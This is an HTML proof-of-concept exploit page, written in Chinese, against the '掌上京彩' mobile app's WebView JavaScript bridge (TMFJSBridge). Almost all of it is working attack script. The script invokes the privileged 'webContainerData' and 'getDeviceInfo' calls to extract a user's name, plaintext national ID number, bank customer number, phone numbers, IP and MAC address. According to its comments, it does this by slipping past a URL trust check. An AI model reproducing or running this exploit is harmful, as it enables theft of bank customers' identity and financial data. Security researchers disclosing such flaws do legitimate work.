<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>掌上京彩 PII 明文窃取 PoC</title>
    <style>
        body { font-family: -apple-system, sans-serif; background: #fff; padding: 20px; }
        .btn { display: block; width: 100%; padding: 15px; background: #c62828; color: white; border: none; border-radius: 6px; font-size: 18px; margin-bottom: 20px;}
        .log-box { display: block; width: 100%; height: 300px; background: #1e1e1e; color: #a9b7c6; font-family: monospace; border: none; padding: 10px; box-sizing: border-box; }
    </style>
</head>
<body>

    <h2 style="color:red; text-align:center;">核心明文窃取利用</h2>
    
    <button class="btn" onclick="executeExploits()">一键提取明文全家桶</button>

    <textarea class="log-box" id="js-console" readonly></textarea>

    <script>
        function printLog(msg) {
            document.getElementById('js-console').value += "[+] " + msg + "\n\n";
        }

        function executeExploits() {
            if (!window.TMFJSBridge) {
                printLog("错误：环境变量未注入，你可能正处在不受信任的外部浏览器中，或 WebView 解析尚未完毕。");
                return;
            }

            printLog("探针释放，正在从特权 JSBridge 中汲取数据...");

            // ========= 进攻点1：打底层容器缓存，越过鉴权获取用户信息大礼包 =========
            var params = { type: "get", key: "loginInfo" };
            window.TMFJSBridge.invoke('webContainerData', params, function(res) {
                if (res && res.status === "0") {
                    try {
                        // 在特权容器中，Android底层取出 AES 加密数据并主动为你解密，你收到的是原生 JSON！
                        var data = typeof res.callbackData === 'string' ? JSON.parse(res.callbackData) : res.callbackData;
                        
                        var plaintextIdCard = data.IdNo || "未登录或无数据";
                        var plaintexCifNo = data.PuserCifNo || "未知CIF";
                        var username = data.UserName || "未知";
                        var bindingPhone = data.UserId || "未知"; // 缓存中的手机号
                        
                        var result = ">>> [重大突破] LoginInfo 提取成功 <<<\n";
                        result += "姓名: " + username + "\n";
                        result += "明文身份证号: " + plaintextIdCard + "\n";
                        result += "核心客户号 (CIF): " + plaintexCifNo + "\n";
                        result += "注册系统账号: " + bindingPhone;
                        
                        printLog(result);
                    } catch(e) {
                         printLog("LoginInfo 解析失败，原始数据: " + res.callbackData);
                    }
                } else {
                    printLog("无法访问 webContainerData 特权接口，可能是未通过 URL startsWith 信任边界校验。");
                }
            });

            // ========= 进攻点2：从设备状态探针获取底层手机硬件绑定的信息 =========
            window.TMFJSBridge.invoke('getDeviceInfo', {}, function(res) {
                 if (res && res.status === "0") {
                     var data = typeof res.callbackData === 'string' ? JSON.parse(res.callbackData) : res.callbackData;
                     // 获取 DB 内保存的用户注册手机及实机物理设备标识
                     var devPhone = data.PHONE_NO || "未知";
                     
                     var result = ">>> [设备指纹] getDeviceInfo 提取成功 <<<\n";
                     result += "机主入网手机号: " + devPhone + "\n";
                     result += "设备真实IP: " + data.ip + "\n";
                     result += "设备 MAC 地址: " + data.mac;
                     printLog(result);
                 }
            });
        }
    </script>
</body>
</html>
